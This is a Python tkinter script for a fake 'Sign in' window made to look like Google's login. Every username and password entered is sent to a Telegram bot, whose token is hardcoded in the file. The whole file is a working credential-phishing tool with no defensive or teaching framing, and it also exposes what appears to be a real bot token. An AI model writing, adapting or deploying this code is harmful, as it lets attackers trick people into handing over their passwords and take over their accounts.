import tkinter as tk
from tkinter import messagebox
import requests

# Replace with your actual Telegram bot token
BOT_TOKEN = "7233414815:AAHhlUfOAiD8SLJNRNWlY4SJ_PV3wZf-GhY"

def get_chat_id(bot_token):
    """
    Retrieve the chat ID from the latest update.
    (Make sure you've sent a message to your bot first.)
    """
    url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
    try:
        response = requests.get(url, timeout=10)
        data = response.json()
        if data.get("ok") and data.get("result"):
            # Use the chat ID from the first update
            chat_id = data["result"][0]["message"]["chat"]["id"]
            return chat_id
        else:
            return None
    except Exception as e:
        print("Error fetching updates:", e)
        return None

def send_to_telegram(message):
    """
    Sends the given message (login credentials) to the auto-detected chat ID.
    """
    chat_id = get_chat_id(BOT_TOKEN)
    if not chat_id:
        messagebox.showerror("Error", "No chat ID found. Please send a message to your bot first.")
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, params=params)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print("Failed to send message:", response.text)
    except Exception as e:
        print("Error sending message to Telegram:", e)

def save_credentials():
    """
    Retrieve the username and password from the form, compose a message, and send it.
    """
    username = entry_username.get()
    password = entry_password.get()

    if not username or not password:
        messagebox.showerror("Error", "Please fill in both fields.")
        return

    message = f"Login Attempt:\nUsername: {username}\nPassword: {password}"
    send_to_telegram(message)
    messagebox.showinfo("Success", "Credentials sent to Telegram Bot!")
    clear_fields()

def clear_fields():
    """
    Clear the username and password entry fields.
    """
    entry_username.delete(0, tk.END)
    entry_password.delete(0, tk.END)

# Create the main window
root = tk.Tk()
root.title("Sign in")
root.geometry("400x350")
root.configure(bg="#f2f2f2")  # Light gray background

# Create a styled frame (the login box)
frame = tk.Frame(root, bg="white", bd=2, relief=tk.RIDGE)
frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER, width=350, height=300)

# Title Label (Google-like header)
label_title = tk.Label(frame, text="Sign in", font=("Helvetica", 20, "bold"), bg="white", fg="#202124")
label_title.pack(pady=(20, 10))

# Username Label and Entry
label_username = tk.Label(frame, text="Username", font=("Helvetica", 12), bg="white", fg="#202124")
label_username.pack(pady=(10, 0))
entry_username = tk.Entry(frame, font=("Helvetica", 12), bd=2, relief=tk.GROOVE)
entry_username.pack(pady=(5, 10), ipadx=5, ipady=3, fill="x", padx=20)

# Password Label and Entry (masked)
label_password = tk.Label(frame, text="Password", font=("Helvetica", 12), bg="white", fg="#202124")
label_password.pack(pady=(10, 0))
entry_password = tk.Entry(frame, font=("Helvetica", 12), bd=2, relief=tk.GROOVE, show="*")
entry_password.pack(pady=(5, 20), ipadx=5, ipady=3, fill="x", padx=20)

# Create a frame for Save and Cancel buttons
button_frame = tk.Frame(frame, bg="white")
button_frame.pack(pady=(0, 20))

# Save button (sends credentials to Telegram)
btn_save = tk.Button(button_frame, text="Save", font=("Helvetica", 12, "bold"), bg="#4285F4", fg="white",
                     bd=0, activebackground="#357ae8", command=save_credentials)
btn_save.grid(row=0, column=0, padx=10, ipadx=10, ipady=5)

# Cancel button (clears the form)
btn_cancel = tk.Button(button_frame, text="Cancel", font=("Helvetica", 12, "bold"), bg="#DB4437", fg="white",
                       bd=0, activebackground="#c33d2e", command=clear_fields)
btn_cancel.grid(row=0, column=1, padx=10, ipadx=10, ipady=5)

# Optional: Add a clickable link label (e.g., "Forgot Password?")
def on_click(event):
    messagebox.showinfo("Info", "Forgot Password link functionality not implemented.")

link_label = tk.Label(frame, text="Forgot Password?", font=("Helvetica", 10, "underline"), fg="#4285F4", bg="white", cursor="hand2")
link_label.pack()
link_label.bind("<Button-1>", on_click)

# Start the Tkinter event loop
root.mainloop()